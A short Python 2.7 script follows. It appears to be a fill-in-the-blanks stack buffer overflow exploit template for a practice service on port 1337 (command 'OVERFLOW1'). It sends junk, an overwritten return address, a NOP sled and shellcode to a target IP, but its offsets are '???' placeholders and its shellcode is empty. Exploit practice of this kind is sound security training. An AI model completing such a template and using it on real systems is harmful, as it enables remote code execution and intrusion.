#!/usr/bin/python2.7
import socket, sys
from pwn import *
from struct import pack

if len(sys.argv) != 2:
        print("[*] Run:\n\toverflow.py <IP-address>")
        sys.exit(1)

address = sys.argv[1]
port = 1337

# Shellcode
shellcode = ()

eip_ret = pack("<L",0x???)
padding = "C"
nops = "\x90" * 16
buff = "A" * ??? + eip_ret + nops + shellcode + padding * (??? - ??? - 4 - ???) # junk ???, eip 4, nops 16, shellcode ???, padding ??? = ???

try:
        log.info("Realizando conexion.")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((address, port))
        data = s.recv(1024)
        s.send("OVERFLOW1 %s\r\n" % buff)
        s.close()
        log.info("Conexion finalizada.")
except Exception as e:
        #print(e)
        log.failure("Error.")
